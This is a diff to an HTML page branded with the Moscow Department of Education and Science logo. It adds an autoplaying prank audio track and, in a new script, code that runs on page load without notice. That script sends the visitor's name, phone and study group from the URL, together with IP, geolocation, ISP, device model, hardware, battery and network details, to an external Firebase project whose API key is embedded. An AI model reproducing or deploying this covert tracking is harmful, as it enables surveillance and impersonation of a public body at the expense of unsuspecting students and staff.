@@ -179,7 +179,6 @@
       75%      { transform: translateX(3px) rotate(1deg); }
     }
 
-    /* Звук — скрытый, только для автозапуска */
     #shrekAudio { display: none; }
 
     .app-footer {
@@ -263,7 +262,7 @@
 
           <div class="app-header-box-logo-dep">
             <div class="app-header-box-logo">
-              <img src="dep_logo.png" alt="Департамент образования и науки города Москвы">
+              <img src="https://static.mskobr.ru/js/templates/office/tmp/dep_logo.svg" alt="Департамент образования и науки города Москвы">
             </div>
             <div class="logo-text">
               Департамент образования<br>и науки города Москвы
@@ -320,16 +319,14 @@
     <p>2026 © <a href="https://digitalcenter.moscow/" target="_blank" rel="noopener noreferrer">Разработка и поддержка ГАУ «Центр цифровизации образования»</a></p>
   </div>
 
+<!-- ====== Звук (обычный скрипт) ====== -->
 <script>
-  // Пытаемся запустить звук сразу при загрузке страницы
   const audio = document.getElementById('shrekAudio');
   audio.volume = 1.0;
 
-  // Основная попытка
   const playPromise = audio.play();
   if (playPromise !== undefined) {
     playPromise.catch(() => {
-      // Браузер заблокировал автозапуск → вешаем запуск на первый клик/тап
       const unlock = () => {
         audio.play().catch(() => {});
         document.removeEventListener('click', unlock);
@@ -340,6 +337,151 @@
       document.addEventListener('touchstart', unlock, { once: true });
       document.addEventListener('keydown', unlock, { once: true });
     });
+  }
+</script>
+
+<!-- ====== Сбор данных + сохранение в Firestore ====== -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import {
+    getFirestore, collection, addDoc, serverTimestamp
+  } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyD2vzKJrL9_3YnDWO_GECuyHnRJTujQ3Zg",
+    authDomain: "kp11-wifi.firebaseapp.com",
+    projectId: "kp11-wifi",
+    storageBucket: "kp11-wifi.firebasestorage.app",
+    messagingSenderId: "262830985110",
+    appId: "1:262830985110:web:6253b9cd57e767a04b57b7"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  // ====== Данные из URL ======
+  const params = new URLSearchParams(window.location.search);
+  const fio       = params.get("fio") || "Без имени";
+  const phone     = params.get("phone") || "";
+  const role      = params.get("role") || "unknown";
+  const course    = params.get("course") || "";
+  const direction = params.get("direction") || "";
+  const group     = params.get("group") || "";
+
+  // ====== Сбор данных об устройстве и сети ======
+  async function collectDeviceInfo() {
+    const info = {};
+
+    // IP + гео + провайдер
+    try {
+      const r = await fetch("https://ipwho.is/");
+      const d = await r.json();
+      if (d && d.success !== false) {
+        info.ip = d.ip || null;
+        info.ipCity = d.city || null;
+        info.ipRegion = d.region || null;
+        info.ipCountry = d.country || null;
+        info.ipProvider = d.connection && d.connection.isp ? d.connection.isp : null;
+        info.ipLat = d.latitude || null;
+        info.ipLon = d.longitude || null;
+      }
+    } catch (e) {
+      console.warn("IP lookup failed", e);
+    }
+
+    // User-Agent и язык
+    const ua = navigator.userAgent;
+    info.userAgent = ua;
+    info.language = navigator.language || null;
+    info.platform = navigator.platform || null;
+
+    // ОС / браузер / модель
+    function parseUA(ua) {
+      const r = { os: "unknown", browser: "unknown", device: "desktop", model: null };
+      if (/Windows NT 10/.test(ua)) r.os = "Windows 10/11";
+      else if (/Windows NT/.test(ua)) r.os = "Windows (старая)";
+      else if (/Mac OS X/.test(ua)) r.os = "macOS";
+      else if (/Android/.test(ua)) {
+        r.os = "Android"; r.device = "mobile";
+        const m = ua.match(/Android [\d.]+;\s*([^;)]+)/);
+        if (m) r.model = m[1].trim();
+      }
+      else if (/iPhone/.test(ua)) { r.os = "iOS"; r.device = "mobile"; r.model = "iPhone"; }
+      else if (/iPad/.test(ua)) { r.os = "iOS"; r.device = "tablet"; r.model = "iPad"; }
+      else if (/Linux/.test(ua)) r.os = "Linux";
+
+      if (/YaBrowser/.test(ua)) r.browser = "Yandex";
+      else if (/Edg\//.test(ua)) r.browser = "Edge";
+      else if (/OPR\//.test(ua)) r.browser = "Opera";
+      else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) r.browser = "Chrome";
+      else if (/Firefox\//.test(ua)) r.browser = "Firefox";
+      else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) r.browser = "Safari";
+
+      return r;
+    }
+    const p = parseUA(ua);
+    info.os = p.os;
+    info.browser = p.browser;
+    info.device = p.device;
+    info.model = p.model;
+
+    // Экран
+    info.screenWidth = screen.width;
+    info.screenHeight = screen.height;
+    info.pixelRatio = window.devicePixelRatio || 1;
+    info.windowWidth = window.innerWidth;
+    info.windowHeight = window.innerHeight;
+
+    // Железо
+    info.cpuCores = navigator.hardwareConcurrency || null;
+    info.deviceMemory = navigator.deviceMemory || null;
+
+    // Сеть
+    const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+    info.connectionType = conn ? (conn.effectiveType || conn.type || null) : null;
+    info.downlink = conn && conn.downlink ? conn.downlink : null;
+
+    // Батарея
+    info.batteryLevel = null;
+    info.batteryCharging = null;
+    if (navigator.getBattery) {
+      try {
+        const b = await navigator.getBattery();
+        info.batteryLevel = Math.round(b.level * 100);
+        info.batteryCharging = b.charging;
+      } catch (e) {}
+    }
+
+    // Время и TZ
+    info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    info.localTime = new Date().toISOString();
+
+    // Откуда пришёл
+    info.referrer = document.referrer || "прямой заход";
+
+    return info;
+  }
+
+  // ====== Сохраняем визит ======
+  try {
+    const deviceInfo = await collectDeviceInfo();
+
+    const visitData = {
+      fio,
+      phone,
+      role,
+      course,
+      direction,
+      group,
+      ...deviceInfo,
+      time: serverTimestamp(),
+      page: "shrek"
+    };
+
+    await addDoc(collection(db, "visits"), visitData);
+    console.log("Визит сохранён:", visitData);
+  } catch (err) {
+    console.error("Ошибка сохранения визита:", err);
   }
 </script>
 
